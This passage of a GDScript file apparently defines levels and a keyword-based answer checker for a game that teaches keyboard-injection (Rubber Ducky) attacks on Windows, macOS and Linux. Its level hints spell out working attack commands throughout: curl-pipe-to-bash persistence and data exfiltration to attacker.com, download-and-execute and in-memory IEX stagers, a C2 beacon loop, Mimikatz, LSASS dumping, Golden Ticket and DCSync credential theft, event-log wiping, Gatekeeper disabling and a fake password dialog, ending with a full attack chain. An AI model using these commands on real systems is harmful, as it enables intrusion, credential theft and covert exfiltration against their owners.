			"hint": "STRING cp duck.plist ~/Library/LaunchAgents/com.duck.agent.plist\nENTER",
			"success_msg": "LaunchAgent planted! .plist persistence is the macOS equivalent of Windows Run keys.",
			"keywords": ["LAUNCHAGENTS", ".PLIST"]
		},
		{
			"id": 75, "xp": 220,
			"title": "Screenshot Capture",
			"desc": "Capture a screenshot on macOS using the screencapture command and save it to a .png file.",
			"hint": "STRING screencapture -x /tmp/screenshot.png\nENTER",
			"success_msg": "Screenshot captured! Visual intel about the target's screen is extremely valuable.",
			"keywords": ["SCREENCAPTURE", ".PNG"]
		},
		{
			"id": 76, "xp": 230,
			"title": "Spotlight File Search",
			"desc": "Use mdfind (Spotlight's CLI) to search for PDF documents or files matching a kind: attribute across the macOS filesystem.",
			"hint": "STRING mdfind kind:pdf\nENTER",
			"success_msg": "Files found via Spotlight! mdfind searches indexed metadata instantly.",
			"keywords": ["MDFIND", "PDF"]
		},
		{
			"id": 77, "xp": 240,
			"title": "Gatekeeper Disable",
			"desc": "Gatekeeper prevents unsigned app execution on macOS. Disable it with spctl --master-disable.",
			"hint": "STRING sudo spctl --master-disable\nENTER",
			"success_msg": "Gatekeeper disabled! Now any unsigned binary can run without quarantine warnings.",
			"keywords": ["SPCTL", "MASTER-DISABLE"]
		},
		{
			"id": 78, "xp": 250,
			"title": "Phishing Dialog",
			"desc": "Use osascript (AppleScript) to display a convincing dialog box prompting the user for their password.",
			"hint": "STRING osascript -e 'display dialog \"Enter your password:\" default answer \"\" with hidden answer'\nENTER",
			"success_msg": "Dialog displayed! AppleScript phishing dialogs look native and convincing.",
			"keywords": ["OSASCRIPT", "DIALOG"]
		},
		{
			"id": 79, "xp": 260,
			"title": "Shell Profile Persistence",
			"desc": "Persist on macOS by appending a command to .zshrc or .bash_profile using echo >>. Runs on every new shell.",
			"hint": "STRING echo 'curl -s http://attacker.com/duck.sh | bash' >> ~/.zshrc\nENTER",
			"success_msg": "Shell profile backdoored! Every new terminal session now phones home.",
			"keywords": [".ZSHRC", "ECHO", ">>"]
		},
		{
			"id": 80, "xp": 280,
			"title": "Webcam Capture",
			"desc": "Capture a webcam photo on macOS using the imagesnap tool and save it as a .jpg file.",
			"hint": "STRING imagesnap -q /tmp/face.jpg\nENTER",
			"success_msg": "Webcam captured! imagesnap is a popular macOS command-line camera tool.",
			"keywords": ["IMAGESNAP", ".JPG"]
		},
		# ── MULTI-STAGE (81-90) ──────────────────────────────────────────────────
		{
			"id": 81, "xp": 280,
			"title": "Recon and Beacon",
			"desc": "Stage 1: Collect systeminfo and exfiltrate it to attacker.com using curl. Combine recon with immediate data exfiltration.",
			"hint": "STRING systeminfo > C:\\info.txt\nENTER\nDELAY 2000\nSTRING curl -d @C:\\info.txt http://attacker.com/collect\nENTER",
			"success_msg": "Recon beaconed! Automated exfiltration is the foundation of any multi-stage operation.",
			"keywords": ["SYSTEMINFO", "CURL", "ATTACKER.COM"]
		},
		{
			"id": 82, "xp": 290,
			"title": "Download and Execute",
			"desc": "Download duck.exe from your server using Invoke-WebRequest then immediately execute it with Start-Process.",
			"hint": "STRING iwr http://attacker.com/duck.exe -OutFile C:\\duck.exe; Start-Process C:\\duck.exe\nENTER",
			"success_msg": "Staged payload deployed! Download-and-execute is the classic dropper pattern.",
			"keywords": ["POWERSHELL", "IWR", "DUCK.EXE", "START-PROCESS"]
		},
		{
			"id": 83, "xp": 295,
			"title": "Privilege Check",
			"desc": "Check if you're running as Administrator using WindowsIdentity and IsInRole before attempting privileged operations.",
			"hint": "STRING [Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'Administrator'\nENTER",
			"success_msg": "Privilege level confirmed! Always check your rights before attempting UAC bypass.",
			"keywords": ["POWERSHELL", "WINDOWSIDENTITY", "ADMINISTRATOR"]
		},
		{
			"id": 84, "xp": 300,
			"title": "Lateral Movement",
			"desc": "Move to another machine on the network using psexec to execute cmd.exe on 192.168.1.50.",
			"hint": "STRING psexec \\\\192.168.1.50 cmd.exe\nENTER",
			"success_msg": "Laterally moved! psexec is the original lateral movement tool.",
			"keywords": ["PSEXEC", "192.168.1.50", "CMD.EXE"]
		},
		{
			"id": 85, "xp": 305,
			"title": "Data Staging",
			"desc": "Compress sensitive files into staged.zip using Compress-Archive before exfiltration.",
			"hint": "STRING Compress-Archive -Path C:\\Users\\*\\Documents -DestinationPath C:\\staged.zip\nENTER",
			"success_msg": "Data staged! Compression reduces exfiltration time and helps avoid size-based detection.",
			"keywords": ["POWERSHELL", "COMPRESS-ARCHIVE", "STAGED.ZIP"]
		},
		{
			"id": 86, "xp": 310,
			"title": "DNS C2 Channel",
			"desc": "Use Resolve-DnsName to query TXT records from your C2 domain. TXT records carry command data in DNS-based C2.",
			"hint": "STRING Resolve-DnsName -Name cmd.attacker.com -Type TXT\nENTER",
			"success_msg": "DNS C2 operational! TXT record queries are virtually never firewalled.",
			"keywords": ["POWERSHELL", "RESOLVE-DNSNAME", "TXT"]
		},
		{
			"id": 87, "xp": 315,
			"title": "Credential Dumping",
			"desc": "Extract plaintext credentials from memory using Mimikatz or sekurlsa::logonpasswords via PowerShell.",
			"hint": "STRING Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'\nENTER",
			"success_msg": "Credentials dumped! logonpasswords is Mimikatz's most famous capability.",
			"keywords": ["POWERSHELL", "MIMIKATZ"]
		},
		{
			"id": 88, "xp": 320,
			"title": "Beaconing Loop",
			"desc": "Create a persistent beaconing loop using PowerShell's while loop with Start-Sleep to repeatedly contact c2.attacker.com.",
			"hint": "STRING while($true){ Invoke-WebRequest http://c2.attacker.com/ping; Start-Sleep 60 }\nENTER",
			"success_msg": "Beacon running! Periodic beacons maintain persistent C2 channels across sessions.",
			"keywords": ["POWERSHELL", "WHILE", "START-SLEEP", "C2.ATTACKER.COM"]
		},
		{
			"id": 89, "xp": 325,
			"title": "In-Memory Execution",
			"desc": "Execute a remote PowerShell script entirely in memory using IEX and DownloadString - no file ever touches disk.",
			"hint": "STRING IEX (New-Object System.Net.WebClient).DownloadString('http://c2.attacker.com/stage2.ps1')\nENTER",
			"success_msg": "Fileless execution! Memory-only payloads defeat all file-based AV solutions.",
			"keywords": ["POWERSHELL", "IEX", "DOWNLOADSTRING"]
		},
		{
			"id": 90, "xp": 330,
			"title": "Full Log Wipe",
			"desc": "Cover all tracks by clearing Security, System, and Application event logs using wevtutil cl.",
			"hint": "STRING wevtutil cl Security & wevtutil cl System & wevtutil cl Application\nENTER",
			"success_msg": "All logs cleared! Without logs, incident response becomes guesswork.",
			"keywords": ["WEVTUTIL", "SECURITY", "SYSTEM", "APPLICATION"]
		},
		# ── ADVANCED OPS (91-99) ────────────────────────────────────────────────
		{
			"id": 91, "xp": 340,
			"title": "Token Impersonation",
			"desc": "Impersonate a privileged user token using WindowsIdentity impersonation in PowerShell to escalate privileges.",
			"hint": "STRING [System.Security.Principal.WindowsIdentity]::Impersonate($token)\nENTER",
			"success_msg": "Token impersonated! Token theft lets you act as any logged-on user.",
			"keywords": ["POWERSHELL", "WINDOWSIDENTITY", "IMPERSONATE"]
		},
		{
			"id": 92, "xp": 350,
			"title": "Pass-the-Hash",
			"desc": "Authenticate to 192.168.1 hosts using an NTLM hash instead of a password. Include -hashes or PTH in your payload.",
			"hint": "STRING pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:hash //192.168.1.1 cmd\nENTER",
			"success_msg": "Hash passed! PTH attacks work wherever NTLM authentication is accepted.",
			"keywords": ["ADMINISTRATOR", "NTLM", "192.168.1"]
		},
		{
			"id": 93, "xp": 355,
			"title": "Kerberoasting",
			"desc": "Request service tickets for SPN-registered accounts using PowerShell. Offline crack the tickets to recover service account passwords.",
			"hint": "STRING Invoke-Kerberoast -OutputFormat Hashcat | Out-File C:\\kerb.txt\nENTER",
			"success_msg": "Kerberoast complete! Service tickets can be cracked offline without detection.",
			"keywords": ["POWERSHELL", "KERBEROAST"]
		},
		{
			"id": 94, "xp": 360,
			"title": "AD Enumeration",
			"desc": "Enumerate Active Directory using Get-ADDomain, Get-ADUser, or AD Module cmdlets to map the domain.",
			"hint": "STRING Get-ADDomain\nENTER\nDELAY 500\nSTRING Get-ADUser -Filter * -Properties *\nENTER",
			"success_msg": "AD fully mapped! Domain structure reveals trust relationships and high-value targets.",
			"keywords": ["POWERSHELL", "GET-ADDOMAIN"]
		},
		{
			"id": 95, "xp": 370,
			"title": "LSASS Dump",
			"desc": "Dump the LSASS process memory using procdump or MiniDump to extract all credential material offline.",
			"hint": "STRING procdump -ma lsass.exe C:\\lsass.dmp\nENTER",
			"success_msg": "LSASS dumped! .dmp files contain all credentials for currently logged-on users.",
			"keywords": ["LSASS", "PROCDUMP"]
		},
		{
			"id": 96, "xp": 380,
			"title": "Golden Ticket",
			"desc": "Forge a Kerberos Golden Ticket using the krbtgt hash to gain persistent domain admin access.",
			"hint": "STRING kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21 /krbtgt:hash /ptt\nENTER",
			"success_msg": "Golden Ticket forged! Valid for 10 years - the ultimate domain persistence.",
			"keywords": ["KERBEROS", "GOLDEN", "KRBTGT"]
		},
		{
			"id": 97, "xp": 390,
			"title": "DCSync Attack",
			"desc": "Perform a DCSync attack to replicate all domain credentials from the DC using dcsync or lsadump::dcsync.",
			"hint": "STRING Invoke-DCSync -User Administrator\nSTRING lsadump::dcsync /domain:corp.local /all\nENTER",
			"success_msg": "DCSync complete! You now have every password hash in the domain.",
			"keywords": ["DCSYNC", "ADMINISTRATOR"]
		},
		{
			"id": 98, "xp": 395,
			"title": "Supply Chain Backdoor",
			"desc": "Backdoor a software update mechanism using Copy-Item or file replacement to inject your payload into the update pipeline.",
			"hint": "STRING Copy-Item C:\\duck.exe 'C:\\Program Files\\App\\update.exe' -Force\nENTER",
			"success_msg": "Supply chain compromised! Update-based backdoors execute with full user trust.",
			"keywords": ["POWERSHELL", "COPY-ITEM", "UPDATE"]
		},
		{
			"id": 99, "xp": 400,
			"title": "Steganographic Exfil",
			"desc": "Exfiltrate data by hiding it inside an image file (.jpg or .png) using Add-Content or a steganography technique.",
			"hint": "STRING Add-Content -Path C:\\innocent.jpg -Value (Get-Content C:\\loot.txt)\nENTER",
			"success_msg": "Data hidden in image! Steganographic exfil bypasses DLP tools that scan file headers.",
			"keywords": ["POWERSHELL", "ADD-CONTENT", ".JPG"]
		},
		# ── BOSS (100) ──────────────────────────────────────────────────────────
		{
			"id": 100, "xp": 1000,
			"title": "ZERO TO HERO: Full Chain",
			"desc": "THE FINAL MISSION. Demonstrate the complete attack chain: Open PowerShell bypassing policy, download a stage-2 from C2, execute in memory via IEX, clear all event logs, and self-destruct. Your payload must include ALL six stages of a professional operation.",
			"hint": "You need ALL six components:\n1. GUI R + POWERSHELL (initial access)\n2. EXECUTIONPOLICY BYPASS\n3. IWR/Invoke-WebRequest + c2.attacker.com (stage-2 download)\n4. IEX/Invoke-Expression (in-memory exec)\n5. WEVTUTIL + SECURITY (log cleanup)\n6. REMOVE-ITEM $MyInvocation or DEL %0 (self-destruct)",
			"success_msg": "OPERATION COMPLETE. You are no longer a script kiddie. You are a DUCK COMMANDER. The corporation's secrets belong to you. 🦆",
			"keywords": ["GUI R", "POWERSHELL", "BYPASS", "IWR", "IEX", "WEVTUTIL", "SELF-DESTRUCT"]
		},
	]

# ─── Solution checker ──────────────────────────────────────────────────────────

func check_solution(id: int, code: String) -> bool:
	match id:
		1:
			return has_str(code, "STRING") and has_str(code, "HELLO") and has_str(code, "WORLD")
		2:
			return has_str(code, "STRING") and has_str(code, "NOTEPAD") and has_cmd(code, "ENTER")
		3:
			return regex_match(code, r"DELAY\s+\d+") and has_str(code, "STRING") and has_str(code, "HELLO")
		4:
			return regex_match(code, r"GUI\s+R") and has_str(code, "NOTEPAD") and has_cmd(code, "ENTER")
		5:
			return has_cmd(code, "REM") and has_cmd(code, "STRING")
		6:
			return regex_match(code, r"ALT\s+F4")
		7:
			return regex_match(code, r"CTRL\s+A") and regex_match(code, r"CTRL\s+C")
		8:
			var re := RegEx.new()
			re.compile(r"(?m)^F5$")
			return re.search(code.to_upper()) != null
		9:
			var count := 0
			for raw_line in code.split("\n"):
				if raw_line.strip_edges().to_upper() == "DOWNARROW":
					count += 1
			return count >= 3
		10:
			return has_str(code, "ADMIN") and has_cmd(code, "TAB") and has_str(code, "PASSWORD") and has_cmd(code, "ENTER")
		11:
			return regex_match(code, r"GUI\s+R") and has_str(code, "CMD") and has_cmd(code, "ENTER")
		12:
			return regex_match(code, r"GUI\s+R") and has_str(code, "CMD") and has_str(code, "WHOAMI")
		13:
			return has_str(code, "CMD") and has_str(code, "IPCONFIG")
		14:
			return has_str(code, "CMD") and has_str(code, "SYSTEMINFO")
		15:
			return has_str(code, "CMD") and has_str(code, "TASKLIST")
		16:
			return has_str(code, "CMD") and has_str(code, "NETSTAT") and has_str(code, "-AN")
		17:
			return has_str(code, "CMD") and has_str(code, "DIR") and has_str(code, "USERS")
		18:
			return has_str(code, "CMD") and regex_match(code, r"\bSET\b")
		19:
			return has_str(code, "SCHTASKS") and has_str(code, "QUERY")
		20:
			return has_str(code, "CMD") and has_str(code, "ARP") and has_str(code, "-A")
		21:
			return regex_match(code, r"GUI\s+R") and has_str(code, "POWERSHELL") and has_cmd(code, "ENTER")
		22:
			return has_str(code, "POWERSHELL") and has_str(code, "USERNAME") and has_str(code, "WRITE-HOST")
		23:
			return has_str(code, "POWERSHELL") and has_str(code, "EXECUTIONPOLICY") and has_str(code, "BYPASS")
		24:
			return has_str(code, "POWERSHELL") and has_str(code, "GET-SERVICE")
		25:
			return has_str(code, "POWERSHELL") and (has_str(code, "INVOKE-WEBREQUEST") or has_str(code, "IWR") or has_str(code, "WGET"))
		26:
			return has_str(code, "POWERSHELL") and (has_str(code, "-ENCODEDCOMMAND") or has_str(code, "-ENC"))
		27:
			return has_str(code, "POWERSHELL") and has_str(code, "GET-PROCESS")
		28:
			return has_str(code, "POWERSHELL") and has_str(code, "GET-ITEMPROPERTY") and has_str(code, "RUN")
		29:
			return has_str(code, "POWERSHELL") and has_str(code, "NEW-ITEM") and has_str(code, "DUCK")
		30:
			return has_str(code, "POWERSHELL") and has_str(code, "TCPCLIENT") and has_str(code, "192.168.1.100")
		31:
			return regex_match(code, r"GUI\s+R") and has_str(code, "SHELL:STARTUP")
		32:
			return has_str(code, "REG ADD") and has_str(code, "RUN") and has_str(code, "DUCK")
		33:
			return has_str(code, "SCHTASKS") and has_str(code, "/CREATE") and has_str(code, "DUCKTASK")
		34:
			return has_str(code, "POWERSHELL") and (has_str(code, "EVENTFILTER") or has_str(code, "INSTANCECREATIONEVENT") or has_str(code, "WMI"))
		35:
			return has_str(code, "POWERSHELL") and (has_str(code, "CREATESHORTCUT") or has_str(code, "WSCRIPT.SHELL")) and has_str(code, ".LNK")
		36:
			return has_str(code, "BITSADMIN") and has_str(code, "DUCKJOB")
		37:
			return has_str(code, "VERSION.DLL") or (has_str(code, "PROGRAM FILES") and has_str(code, ".DLL"))
		38:
			return has_str(code, "SC CREATE") and has_str(code, "DUCKSVC")
		39:
			return has_str(code, "POWERSHELL") and has_str(code, "SET-MPPREFERENCE") and has_str(code, "DISABLEREALTIMEMONITORING")
		40:
			return has_str(code, "ADVFIREWALL") and has_str(code, "DUCKC2") and has_str(code, "4444")
		41:
			return has_str(code, "CMD") and has_str(code, "PING") and has_str(code, "8.8.8.8")
		42:
			return has_str(code, "TRACERT") and has_str(code, "GOOGLE")
		43:
			return has_str(code, "NSLOOKUP") and has_str(code, "TARGET.COM")
		44:
			return has_str(code, "NET VIEW") and has_str(code, "/ALL")
		45:
			return has_str(code, "NET USE") and has_str(code, "Z:") and has_str(code, "192.168.1")
		46:
			return has_str(code, "POWERSHELL") and has_str(code, "TEST-NETCONNECTION") and has_str(code, "192.168.1.1")
		47:
			return has_str(code, "CURL") and has_str(code, "POST") and has_str(code, "ATTACKER.COM")
		48:
			return has_str(code, "NSLOOKUP") and has_str(code, "ATTACKER.COM")
		49:
			return has_str(code, "POWERSHELL") and has_str(code, "TCPCLIENT") and has_str(code, "9001")
		50:
			return has_str(code, "NETSH WLAN") and has_str(code, "PROFILES")
		51:
			# Need >= 3 unique DELAY values
			var re := RegEx.new()
			re.compile(r"DELAY\s+(\d+)")
			var results := re.search_all(code.to_upper())
			var unique_delays := {}
			for r in results:
				unique_delays[r.get_string(1)] = true
			return unique_delays.size() >= 3
		52:
			return has_str(code, "CERTUTIL") and (has_str(code, "-DECODE") or has_str(code, "-ENCODE"))
		53:
			return has_str(code, "POWERSHELL") and (has_str(code, "AMSI") or has_str(code, "AMSIINITFAILED") or has_str(code, "AMSIUTILS"))
		54:
			# Check for IEX or I+E+X patterns
			return has_str(code, "POWERSHELL") and (has_str(code, "IEX") or (has_str(code, "'I'+'E'+'X'")) or has_str(code, "INVOKE-EXPRESSION"))
		55:
			return (has_str(code, "CMD") and has_str(code, ":HIDDEN")) or (has_str(code, ".TXT:") and has_str(code, "ECHO"))
		56:
			return has_str(code, "WEVTUTIL") and has_str(code, "CL") and has_str(code, "SECURITY")
		57:
			return has_str(code, "POWERSHELL") and has_str(code, "LASTWRITETIME") and has_str(code, "ADDYEARS")
		58:
			return has_str(code, "POWERSHELL") and has_str(code, "START-PROCESS") and (has_str(code, "HIDDEN") or has_str(code, "SUSPEND"))
		59:
			return has_str(code, "REG ADD") and has_str(code, "MS-SETTINGS") and (has_str(code, "CMD.EXE") or has_str(code, "COMMAND"))
		60:
			return has_str(code, "DEL %0") or (has_str(code, "REMOVE-ITEM") and has_str(code, "MYCOMMAND"))
		61:
			return regex_match(code, r"CTRL\s+ALT\s+T")
		62:
			return regex_match(code, r"CTRL\s+ALT\s+T") and regex_match(code, r"\bSTRING\s+ID\b")
		63:
			return has_str(code, "LS") and has_str(code, "-LA") and has_str(code, "/HOME")
		64:
			return has_str(code, "CAT") and has_str(code, "SSH") and has_str(code, "ID_RSA")
		65:
			return has_str(code, "CRONTAB") and (has_str(code, "DUCK") or has_str(code, "* * * *"))
		66:
			return has_str(code, "FIND") and has_str(code, "-PERM") and has_str(code, "4000")
		67:
			return has_str(code, "CAT") and has_str(code, "/ETC/PASSWD")
		68:
			return has_str(code, "NC") and has_str(code, "4444") and (has_str(code, "-L") or has_str(code, "LVNP"))
		69:
			return has_str(code, "BASH") and has_str(code, "/DEV/TCP/") and has_str(code, "192.168.1.100")
		70:
			return has_str(code, "SUDO") and has_str(code, "-L")
		71:
			return regex_match(code, r"GUI\s+SPACE") and has_str(code, "TERMINAL") and has_cmd(code, "ENTER")
		72:
			return regex_match(code, r"GUI\s+SPACE") and has_str(code, "WHOAMI") and has_str(code, " ID")
		73:
			return has_str(code, "SECURITY") and has_str(code, "DUMP-KEYCHAIN")
		74:
			return has_str(code, "LAUNCHAGENTS") and has_str(code, ".PLIST")
		75:
			return has_str(code, "SCREENCAPTURE") and has_str(code, ".PNG")
		76:
			return has_str(code, "MDFIND") and (has_str(code, "PDF") or has_str(code, "KIND:"))
		77:
			return has_str(code, "SPCTL") and has_str(code, "MASTER-DISABLE")
		78:
			return has_str(code, "OSASCRIPT") and (has_str(code, "DIALOG") or has_str(code, "DISPLAY"))
		79:
			return (has_str(code, ".ZSHRC") or has_str(code, "BASH_PROFILE")) and has_str(code, "ECHO") and has_str(code, ">>")
		80:
			return has_str(code, "IMAGESNAP") and has_str(code, ".JPG")
		81:
			return has_str(code, "SYSTEMINFO") and has_str(code, "CURL") and has_str(code, "ATTACKER.COM")
		82:
			return has_str(code, "POWERSHELL") and (has_str(code, "IWR") or has_str(code, "INVOKE-WEBREQUEST")) and has_str(code, "DUCK.EXE") and has_str(code, "START-PROCESS")
		83:
			return has_str(code, "POWERSHELL") and has_str(code, "WINDOWSIDENTITY") and has_str(code, "ADMINISTRATOR")
		84:
			return has_str(code, "PSEXEC") and has_str(code, "192.168.1.50") and has_str(code, "CMD.EXE")
		85:
			return has_str(code, "POWERSHELL") and has_str(code, "COMPRESS-ARCHIVE") and has_str(code, "STAGED.ZIP")
		86:
			return has_str(code, "POWERSHELL") and has_str(code, "RESOLVE-DNSNAME") and has_str(code, "TXT")
		87:
			return has_str(code, "POWERSHELL") and (has_str(code, "SEKURLSA") or has_str(code, "MIMIKATZ") or has_str(code, "LOGONPASSWORDS"))
		88:
			return has_str(code, "POWERSHELL") and has_str(code, "WHILE") and (has_str(code, "START-SLEEP") or has_str(code, "SLEEP")) and has_str(code, "C2.ATTACKER.COM")
		89:
			return has_str(code, "POWERSHELL") and (has_str(code, "IEX") or has_str(code, "INVOKE-EXPRESSION")) and has_str(code, "DOWNLOADSTRING")
		90:
			return has_str(code, "WEVTUTIL") and has_str(code, "SECURITY") and has_str(code, "SYSTEM") and has_str(code, "APPLICATION")
		91:
			return has_str(code, "POWERSHELL") and (has_str(code, "IMPERSONATION") or has_str(code, "WINDOWSIDENTITY") or has_str(code, "IMPERSONATE"))
		92:
			return has_str(code, "ADMINISTRATOR") and (has_str(code, "-HASHES") or has_str(code, "PTH") or has_str(code, "NTLM")) and has_str(code, "192.168.1")
		93:
			return has_str(code, "POWERSHELL") and (has_str(code, "KERBEROAST") or has_str(code, "SPN"))
		94:
			return has_str(code, "POWERSHELL") and (has_str(code, "GET-ADDOMAIN") or has_str(code, "GET-ADUSER") or has_str(code, "ADMODULE"))
		95:
			return has_str(code, "LSASS") and (has_str(code, "PROCDUMP") or has_str(code, "MINIDUMP") or has_str(code, ".DMP"))
		96:
			return has_str(code, "KERBEROS") and has_str(code, "GOLDEN") and (has_str(code, "KRBTGT") or has_str(code, "KERBEROS::GOLDEN"))
		97:
			return has_str(code, "DCSYNC") and (has_str(code, "ADMINISTRATOR") or has_str(code, "LSADUMP"))
		98:
			return has_str(code, "POWERSHELL") and (has_str(code, "COPY-ITEM") or has_str(code, "REPLACE")) and (has_str(code, "UPDATE") or has_str(code, "BACKDOOR"))
		99:
			return has_str(code, "POWERSHELL") and (has_str(code, "ADD-CONTENT") or has_str(code, "STEG")) and (has_str(code, ".JPG") or has_str(code, ".PNG"))
		100:
			var c1 := regex_match(code, r"GUI\s+R") and has_str(code, "POWERSHELL")
			var c2 := has_str(code, "BYPASS") or has_str(code, "EXECUTIONPOLICY")
			var c3 := (has_str(code, "IWR") or has_str(code, "INVOKE-WEBREQUEST") or has_str(code, "DOWNLOADSTRING")) and has_str(code, "C2.ATTACKER.COM")
			var c4 := has_str(code, "IEX") or has_str(code, "INVOKE-EXPRESSION")
			var c5 := has_str(code, "WEVTUTIL") and has_str(code, "SECURITY")
			var c6 := (has_str(code, "REMOVE-ITEM") and has_str(code, "MYCOMMAND")) or has_str(code, "DEL %0")
			return c1 and c2 and c3 and c4 and c5 and c6
		_:
			return false

# ─── Utility ──────────────────────────────────────────────────────────────────

func get_level(id: int) -> Dictionary:
	for lvl in levels:
		if lvl["id"] == id:
			return lvl
	return {}

func get_section(id: int) -> Dictionary:
	for sec in SECTIONS:
		if id >= sec["start"] and id <= sec["end"]:
			return sec
	return SECTIONS[0]

func get_rank(solved_count: int) -> String:
	# 26 ranks over 100 levels
	var idx := int(float(solved_count) / 100.0 * (RANKS.size() - 1))
	idx = clampi(idx, 0, RANKS.size() - 1)
	return RANKS[idx]
